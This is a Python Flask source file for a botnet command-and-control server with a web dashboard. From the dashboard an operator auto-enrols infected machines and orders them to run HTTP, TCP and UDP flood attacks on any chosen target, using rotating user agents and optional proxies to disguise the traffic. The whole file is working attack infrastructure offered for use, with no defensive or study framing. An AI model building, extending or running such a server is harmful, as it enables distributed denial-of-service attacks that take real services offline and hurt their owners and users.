"""
ENHANCED BOTNET C2 SERVER - FIXED
==================================
Features:
- Auto-approval system
- Custom user agent management
- Optional proxy support
- Modern blue/black interface
- Resource-friendly operations

Run: python server.py [port]
Example: python server.py 5000
"""

import threading
import json
import time
import os
from datetime import datetime

try:
    from flask import Flask, render_template_string, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app)

# Global storage
approved_bots = {}
commands_queue = {}
attack_logs = []
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
]
proxy_list = []

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #42a5f5;
            text-shadow: 0 0 20px rgba(66, 165, 245, 0.5);
        }
        .header p { color: #90caf9; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #1976d2;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(25, 118, 210, 0.3);
        }
        .stat-box h3 { color: #42a5f5; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #90caf9; font-weight: bold; }
        .section {
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
        }
        .section h2 {
            color: #42a5f5;
            margin-bottom: 20px;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #1976d2;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(25, 118, 210, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { border-color: #546e7a; color: #90a4ae; }
        .bot-item.online { border-color: #66bb6a; }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-online { background: #66bb6a; box-shadow: 0 0 10px #66bb6a; }
        .status-offline { background: #546e7a; }
        .btn {
            background: #1976d2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #1565c0;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.4);
        }
        .btn-danger { background: #d32f2f; }
        .btn-danger:hover { background: #c62828; }
        input, select, textarea, button {
            background: rgba(13, 27, 42, 0.8);
            border: 2px solid #1976d2;
            color: #e3f2fd;
            padding: 12px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #42a5f5;
            box-shadow: 0 0 12px rgba(66, 165, 245, 0.3);
        }
        button {
            cursor: pointer;
            font-weight: 600;
            background: rgba(25, 118, 210, 0.2);
        }
        button:hover { 
            background: #1976d2;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(25, 118, 210, 0.3);
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { 
            display: block; 
            margin-bottom: 8px;
            color: #90caf9;
            font-weight: 500;
        }
        textarea { 
            min-height: 120px; 
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        .log {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #1976d2;
            border-radius: 6px;
        }
        .log-entry { 
            margin-bottom: 8px;
            padding: 6px;
            border-left: 3px solid #1976d2;
            padding-left: 10px;
        }
        .success { color: #66bb6a; border-left-color: #66bb6a; }
        .error { color: #ef5350; border-left-color: #ef5350; }
        .warning { color: #ffa726; border-left-color: #ffa726; }
        .info { color: #42a5f5; border-left-color: #42a5f5; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
        ::-webkit-scrollbar-thumb { 
            background: #1976d2;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover { background: #1565c0; }
        .no-bots {
            text-align: center;
            padding: 30px;
            color: #546e7a;
            font-size: 1.1em;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2 CONTROL PANEL</h1>
        <p>Auto-Approval System | Resource Optimized</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>ACTIVE BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ONLINE BOTS</h3>
            <p id="online-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>USER AGENTS</h3>
            <p id="user-agents-count">0</p>
        </div>
    </div>

    <div class="section">
        <h2>CONNECTED BOTS</h2>
        <div id="approved-list" class="bot-list">
            <div class="no-bots">Waiting for bot connections...</div>
        </div>
    </div>

    <div class="section">
        <h2>USER AGENT MANAGEMENT</h2>
        <div class="form-group">
            <label>User Agents (one per line):</label>
            <textarea id="user-agents" placeholder="Mozilla/5.0 ..."></textarea>
        </div>
        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
    </div>

    <div class="section">
        <h2>PROXY MANAGEMENT (Optional)</h2>
        <div class="form-group">
            <label>Proxies (format: ip:port or user:pass@ip:port, one per line):</label>
            <textarea id="proxies" placeholder="1.2.3.4:8080
user:pass@5.6.7.8:8080"></textarea>
        </div>
        <button onclick="updateProxies()">UPDATE PROXIES</button>
    </div>

    <div class="section">
        <h2>HTTP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-300):</label>
            <input type="number" id="http-threads" value="100" min="50" max="300">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()">LAUNCH HTTP FLOOD</button>
    </div>

    <div class="section">
        <h2>TCP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="tcp-target" placeholder="example.com:80">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="tcp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="tcp-duration" value="60">
        </div>
        <button onclick="launchTCPFlood()">LAUNCH TCP FLOOD</button>
    </div>

    <div class="section">
        <h2>UDP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="udp-target" placeholder="example.com:53">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="udp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="udp-duration" value="60">
        </div>
        <button onclick="launchUDPFlood()">LAUNCH UDP FLOOD</button>
    </div>

    <div class="section">
        <h2>BOT COMMANDS</h2>
        <button onclick="sendPing()">PING ALL BOTS</button>
        <button onclick="sendSysInfo()">GET SYSTEM INFO</button>
        <button onclick="stopAllAttacks()">STOP ALL ATTACKS</button>
    </div>

    <div class="section">
        <h2>ACTIVITY LOGS</h2>
        <div id="logs" class="log"></div>
    </div>

    <script>
        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function updateUserAgents() {
            const agents = document.getElementById('user-agents').value;
            fetch('/api/user-agents', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_agents: agents })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to update user agents');
            });
        }

        function updateProxies() {
            const proxies = document.getElementById('proxies').value;
            fetch('/api/proxies', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ proxies: proxies })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to update proxies');
            });
        }

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('user-agents-count').textContent = data.user_agents_count;
                    
                    document.getElementById('user-agents').value = data.user_agents.join('\\n');
                    document.getElementById('proxies').value = data.proxies.join('\\n');
                    
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div class="no-bots">No bots connected. Run the client to connect.</div>';
                    } else {
                        data.approved.forEach(bot => {
                            const div = document.createElement('div');
                            const statusClass = bot.online ? 'online' : 'offline';
                            const statusIndicator = bot.online ? 'status-online' : 'status-offline';
                            
                            div.className = 'bot-item ' + statusClass;
                            div.innerHTML = `
                                <div>
                                    <span class="status-indicator ${statusIndicator}"></span>
                                    <strong>[${bot.bot_id}]</strong> - 
                                    ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
                                    ${bot.specs.os} - 
                                    Status: <strong>${bot.status || 'idle'}</strong> - 
                                    Last seen: ${bot.last_seen}
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                    
                    const logsDiv = document.getElementById('logs');
                    if(data.logs.length === 0) {
                        logsDiv.innerHTML = '<div style="text-align:center;color:#546e7a;">No activity yet</div>';
                    } else {
                        logsDiv.innerHTML = data.logs.slice(-30).reverse().map(log => 
                            `<div class="log-entry ${log.type}">[${log.time}] ${log.message}</div>`
                        ).join('');
                    }
                })
                .catch(err => console.error('Error fetching stats:', err));
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            fetch('/api/attack/http', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads, method })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to launch attack');
            });
        }

        function launchTCPFlood() {
            const target = document.getElementById('tcp-target').value;
            const duration = document.getElementById('tcp-duration').value;
            const threads = document.getElementById('tcp-threads').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            fetch('/api/attack/tcp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to launch attack');
            });
        }

        function launchUDPFlood() {
            const target = document.getElementById('udp-target').value;
            const duration = document.getElementById('udp-duration').value;
            const threads = document.getElementById('udp-threads').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            fetch('/api/attack/udp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to launch attack');
            });
        }

        function sendPing() {
            fetch('/api/command/ping', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to send ping');
                });
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to get system info');
                });
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks on all bots?')) {
                fetch('/api/command/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => {
                        console.error('Error:', err);
                        alert('Failed to stop attacks');
                    });
            }
        }

        // Update stats every 2 seconds
        setInterval(updateStats, 2000);
        updateStats();
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/check_approval', methods=['POST'])
def check_approval():
    try:
        data = request.json
        if not data:
            return jsonify({'approved': False, 'error': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        specs = data.get('specs', {})
        
        if not bot_id:
            return jsonify({'approved': False, 'error': 'No bot_id'}), 400
        
        current_time = time.time()
        
        # Auto-approve all bots
        if bot_id not in approved_bots:
            approved_bots[bot_id] = {
                'specs': specs,
                'last_seen': current_time,
                'status': 'connected',
                'approved_at': current_time
            }
            attack_logs.append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'type': 'success',
                'message': f'Bot connected: {bot_id} - {specs.get("os", "unknown")} - {specs.get("cpu_cores", "?")} cores'
            })
            print(f"[+] Bot connected and approved: {bot_id}")
        else:
            # Update last seen
            approved_bots[bot_id]['last_seen'] = current_time
            if approved_bots[bot_id].get('status') == 'disconnected':
                approved_bots[bot_id]['status'] = 'reconnected'
                print(f"[+] Bot reconnected: {bot_id}")
        
        return jsonify({'approved': True})
    except Exception as e:
        print(f"[!] Error in check_approval: {e}")
        return jsonify({'approved': False, 'error': str(e)}), 500

@app.route('/commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    try:
        if bot_id in approved_bots:
            approved_bots[bot_id]['last_seen'] = time.time()
        
        commands = commands_queue.get(bot_id, [])
        commands_queue[bot_id] = []
        
        return jsonify({'commands': commands})
    except Exception as e:
        print(f"[!] Error in get_commands: {e}")
        return jsonify({'commands': []}), 500

@app.route('/status', methods=['POST'])
def receive_status():
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        if bot_id in approved_bots:
            approved_bots[bot_id]['status'] = status
            approved_bots[bot_id]['last_seen'] = time.time()
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': status,
            'message': f"{bot_id}: {message}"
        })
        
        print(f"[*] Status from {bot_id}: {status} - {message}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[!] Error in receive_status: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/user-agents', methods=['GET', 'POST'])
def manage_user_agents():
    global user_agents
    
    try:
        if request.method == 'POST':
            data = request.json
            agents_text = data.get('user_agents', '')
            new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
            
            if new_agents:
                user_agents = new_agents
                attack_logs.append({
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'type': 'info',
                    'message': f'Updated {len(user_agents)} user agents'
                })
                print(f"[+] Updated {len(user_agents)} user agents")
                return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} user agents'})
            
            return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
        
        return jsonify({'user_agents': user_agents})
    except Exception as e:
        print(f"[!] Error in manage_user_agents: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/proxies', methods=['GET', 'POST'])
def manage_proxies():
    global proxy_list
    
    try:
        if request.method == 'POST':
            data = request.json
            proxies_text = data.get('proxies', '')
            new_proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()]
            
            proxy_list = new_proxies
            attack_logs.append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'type': 'info',
                'message': f'Updated {len(proxy_list)} proxies'
            })
            print(f"[+] Updated {len(proxy_list)} proxies")
            return jsonify({'status': 'success', 'message': f'Updated {len(proxy_list)} proxies'})
        
        return jsonify({'proxies': proxy_list})
    except Exception as e:
        print(f"[!] Error in manage_proxies: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/remove/<bot_id>', methods=['POST'])
def remove_bot(bot_id):
    try:
        if bot_id in approved_bots:
            del approved_bots[bot_id]
            if bot_id in commands_queue:
                del commands_queue[bot_id]
            
            attack_logs.append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'type': 'error',
                'message': f'Bot removed: {bot_id}'
            })
            
            print(f"[-] Bot removed: {bot_id}")
            return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
        
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
    except Exception as e:
        print(f"[!] Error in remove_bot: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        current_time = time.time()
        online_bots = 0
        active_attacks = 0
        
        # Mark offline bots
        for bot_id, info in list(approved_bots.items()):
            time_diff = current_time - info['last_seen']
            if time_diff < 30:
                online_bots += 1
                if info.get('status') == 'running':
                    active_attacks += 1
            elif info.get('status') != 'offline':
                info['status'] = 'offline'
        
        approved_list = []
        for bot_id, info in approved_bots.items():
            is_online = (current_time - info['last_seen']) < 30
            approved_list.append({
                'bot_id': bot_id,
                'specs': info.get('specs', {}),
                'status': info.get('status', 'unknown'),
                'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
                'online': is_online
            })
        
        return jsonify({
            'approved_bots': len(approved_bots),
            'online_bots': online_bots,
            'active_attacks': active_attacks,
            'user_agents_count': len(user_agents),
            'approved': approved_list,
            'logs': attack_logs[-50:],
            'user_agents': user_agents,
            'proxies': proxy_list
        })
    except Exception as e:
        print(f"[!] Error in get_stats: {e}")
        return jsonify({
            'approved_bots': 0,
            'online_bots': 0,
            'active_attacks': 0,
            'user_agents_count': 0,
            'approved': [],
            'logs': [],
            'user_agents': [],
            'proxies': []
        }), 500

@app.route('/api/attack/http', methods=['POST'])
def launch_http_attack():
    try:
        data = request.json
        
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {
                    'type': 'http_flood',
                    'target': data['target'],
                    'duration': int(data['duration']),
                    'threads': int(data['threads']),
                    'method': data.get('method', 'GET'),
                    'user_agents': user_agents,
                    'proxies': proxy_list
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'warning',
            'message': f'HTTP {data.get("method", "GET")} flood to {sent_count} bots -> {data["target"]} ({data["threads"]} threads)'
        })
        
        print(f"[+] HTTP flood sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in launch_http_attack: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/tcp', methods=['POST'])
def launch_tcp_attack():
    try:
        data = request.json
        
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {
                    'type': 'tcp_flood',
                    'target': data['target'],
                    'duration': int(data['duration']),
                    'threads': int(data['threads'])
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'warning',
            'message': f'TCP flood to {sent_count} bots -> {data["target"]} ({data["threads"]} threads)'
        })
        
        print(f"[+] TCP flood sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in launch_tcp_attack: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/udp', methods=['POST'])
def launch_udp_attack():
    try:
        data = request.json
        
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {
                    'type': 'udp_flood',
                    'target': data['target'],
                    'duration': int(data['duration']),
                    'threads': int(data['threads'])
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'warning',
            'message': f'UDP flood to {sent_count} bots -> {data["target"]} ({data["threads"]} threads)'
        })
        
        print(f"[+] UDP flood sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in launch_udp_attack: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/ping', methods=['POST'])
def send_ping():
    try:
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {'type': 'ping'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'success',
            'message': f'Ping sent to {sent_count} bots'
        })
        
        print(f"[+] Ping sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in send_ping: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/sysinfo', methods=['POST'])
def send_sysinfo():
    try:
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {'type': 'sysinfo'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'success',
            'message': f'Sysinfo request sent to {sent_count} bots'
        })
        
        print(f"[+] Sysinfo sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Sysinfo sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in send_sysinfo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/stop', methods=['POST'])
def send_stop_all():
    try:
        sent_count = 0
        current_time = time.time()
        
        for bot_id, info in approved_bots.items():
            if current_time - info['last_seen'] < 30:
                command = {'type': 'stop_all'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        if sent_count == 0:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'error',
            'message': f'Stop all attacks command sent to {sent_count} bots'
        })
        
        print(f"[+] Stop command sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots'})
    except Exception as e:
        print(f"[!] Error in send_stop_all: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    import sys
    
    print("\n" + "="*60)
    print("  ENHANCED C2 SERVER - AUTO APPROVAL ENABLED")
    print("="*60)
    
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    port = int(os.environ.get('PORT', port))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Dashboard: http://0.0.0.0:{port}")
    print(f"[+] All bots will be auto-approved")
    print(f"[+] User agents: {len(user_agents)} loaded")
    print(f"[+] Waiting for connections...\n")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
